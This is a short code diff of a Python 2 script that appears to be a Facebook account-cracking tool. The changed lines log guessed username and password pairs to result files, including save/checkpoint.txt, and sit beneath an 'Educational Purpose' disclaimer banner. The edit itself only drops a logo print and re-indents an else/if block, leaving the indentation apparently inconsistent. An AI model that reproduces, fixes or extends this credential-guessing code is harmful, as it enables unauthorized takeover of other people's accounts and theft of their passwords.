@@ -433,7 +433,6 @@ def lisensi():
 ####login#########
 def login():
 	os.system('clear')
-	print logo11
         print "\033[1;95m«-----------------\033[1;91mDisclaimer\033[1;95m---------------»"
         time.sleep(0.05)
         print "\033[1;43m       \033[1;34mThis Tool is for Educational Purpose   \033[1;0m"
@@ -4114,8 +4113,8 @@ def action():
  				                        okb.write(k+c+user+'-•◈•-'+pass4+'\n')
  				                        okb.close()
  				                        oks.append(c+user+pass4)
- 				                    else:
- 				                        if 'www.facebook.com' in q['error_msg']:
+ 				               else:
+ 				                   if 'www.facebook.com' in q['error_msg']:
  					                        print '\033[1;96m[Error] ' + k + c + user + '  》  ' + pass4+'\n'
  					                        cps = open('save/checkpoint.txt', 'a')
  					                        cps.write(k+c+user+'-•◈•-'+pass4+'\n')
